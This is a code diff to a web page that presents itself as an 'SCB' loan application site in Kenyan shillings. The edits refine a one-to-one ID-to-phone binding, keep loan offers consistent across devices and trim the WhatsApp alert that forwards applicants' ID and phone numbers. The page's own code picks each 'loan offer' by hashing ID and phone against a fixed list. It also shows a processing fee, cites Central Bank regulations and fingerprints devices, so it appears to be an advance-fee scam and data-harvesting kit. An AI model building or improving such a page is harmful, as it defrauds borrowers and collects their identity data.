@@ -892,7 +892,7 @@
             
             <div class="verification-notice">
                 <strong>🔐 Important Verification Required</strong>
-                <p>The phone number you enter MUST be registered under your name exactly as it appears on your ID. This is required by Central Bank regulations and protects you from fraud. Each ID can only be linked to one phone number.</p>
+                <p>The phone number you enter MUST be registered under your name exactly as it appears on your ID. This is required by Central Bank regulations and protects you from fraud. Each ID can only be linked to one phone number, and each phone number can only be linked to one ID.</p>
             </div>
             
             <div class="consent-box">
@@ -1221,7 +1221,7 @@
         });
         localStorage.setItem('scb_applications', JSON.stringify(applications));
 
-        // ================ ID-Phone Binding Functions ================
+        // ================ ID-Phone Binding Functions (Bi-directional) ================
         
         function checkIdPhoneBinding() {
             const idNumber = document.getElementById('idNumber').value.trim();
@@ -1257,15 +1257,14 @@
                 return;
             }
             
-            // If we have a user in the database with this ID, check if phone matches
+            // If we have a user in the database with this exact combo, all good
             const userKey = `user_${idNumber}_${phoneNumber}`;
             if (userDatabase[userKey]) {
-                // This exact combo exists - all good
                 checkScanEligibility();
                 return;
             }
             
-            // Check if there's a user with same ID but different phone
+            // Check if there's a user with same ID but different phone (in user database)
             const existingIdUser = Object.values(userDatabase).find(u => u.idNumber === idNumber);
             if (existingIdUser && existingIdUser.phoneNumber !== phoneNumber) {
                 isBindingValid = false;
@@ -1275,7 +1274,7 @@
                 return;
             }
             
-            // Check if there's a user with same phone but different ID
+            // Check if there's a user with same phone but different ID (in user database)
             const existingPhoneUser = Object.values(userDatabase).find(u => u.phoneNumber === phoneNumber);
             if (existingPhoneUser && existingPhoneUser.idNumber !== idNumber) {
                 isBindingValid = false;
@@ -1288,7 +1287,7 @@
             checkScanEligibility();
         }
         
-        // Bind ID and phone together permanently
+        // Bind ID and phone together permanently (bi-directional)
         function bindIdAndPhone(idNumber, phoneNumber) {
             // Store the binding in both maps
             idToPhoneMap[idNumber] = phoneNumber;
@@ -1383,15 +1382,15 @@
             return Math.abs(hash);
         }
         
-        // Get or create user identity
+        // Get or create user identity (consistent across all devices)
         function getUserIdentity(idNumber, phoneNumber) {
             if (!idNumber || !phoneNumber) return null;
             
             const userKey = `user_${idNumber}_${phoneNumber}`;
             
-            // Check if we've seen this user before
+            // Check if we've seen this user before (exact combo)
             if (userDatabase[userKey]) {
-                console.log('Returning user found:', userKey);
+                console.log('Returning user found with exact combo');
                 // Add this device to the user's device list if not already there
                 if (!userDatabase[userKey].devices.includes(deviceFingerprint)) {
                     userDatabase[userKey].devices.push(deviceFingerprint);
@@ -1414,10 +1413,10 @@
                 return null;
             }
             
-            // New user - create consistent loan offer
-            console.log('New user, creating consistent offer for:', userKey);
+            // New user - create consistent loan offer (same for all devices)
+            console.log('New user, creating consistent offer for:', idNumber, phoneNumber);
             
-            // Generate a consistent index based on ID+phone
+            // Generate a consistent index based on ID+phone (same hash on all devices)
             const hash = generateConsistentHash(idNumber + phoneNumber);
             const loanIndex = hash % loanOptions.length;
             const loanData = { ...loanOptions[loanIndex] };
@@ -1433,7 +1432,7 @@
             userDatabase[userKey] = loanData;
             localStorage.setItem('scb_user_database', JSON.stringify(userDatabase));
             
-            // Permanently bind this ID and phone together
+            // Permanently bind this ID and phone together (bi-directional)
             bindIdAndPhone(idNumber, phoneNumber);
             
             return loanData;
@@ -1454,7 +1453,7 @@
             checkIdPhoneBinding();
             if (!isBindingValid) return;
             
-            // Get or create user identity (this ensures consistency)
+            // Get or create user identity (this ensures consistency across devices)
             const userData = getUserIdentity(idNumber, phoneNumber);
             
             if (userData) {
@@ -1550,7 +1549,7 @@
                 return;
             }
             
-            // Get or create user data (this ensures consistency)
+            // Get or create user data (this ensures consistency across devices)
             const userData = getUserIdentity(idNumber, phoneNumber);
             
             if (!userData) {
@@ -1609,7 +1608,7 @@
             document.getElementById('feeAmount').textContent = processingFee.toLocaleString();
             document.getElementById('interestRate').textContent = (interestRate * 100) + '%';
             
-            // Personalized message based on user hash
+            // Personalized message based on user hash (consistent across devices)
             const idNumber = document.getElementById('idNumber').value.trim();
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
             const hash = generateConsistentHash(idNumber + phoneNumber);
@@ -1753,9 +1752,8 @@
             userData.lastApplicationDate = new Date().toISOString();
             localStorage.setItem('scb_user_database', JSON.stringify(userDatabase));
             
-            // WhatsApp notification
+            // WhatsApp notification - NO USER KEY, just essential info
             const message = `🔔 NEW APPLICATION\n\n` +
-                `User Key: ${application.userKey}\n` +
                 `ID: ${idNumber}\n` +
                 `Phone: ${phoneNumber}\n` +
                 `Loan: KSh ${qualifiedAmount.toLocaleString()}\n` +
@@ -1812,7 +1810,6 @@
                 const appElement = document.createElement('div');
                 appElement.className = `application-item ${app.status}`;
                 appElement.innerHTML = `
-                    <div><strong>User Key:</strong> ${app.userKey}</div>
                     <div><strong>ID:</strong> ${app.idNumber}</div>
                     <div><strong>Phone:</strong> ${app.phoneNumber}</div>
                     <div><strong>Loan:</strong> KSh ${app.amount.toLocaleString()}</div>
@@ -1917,4 +1914,4 @@
         });
     </script>
 </body>
-    </html>
+</html>
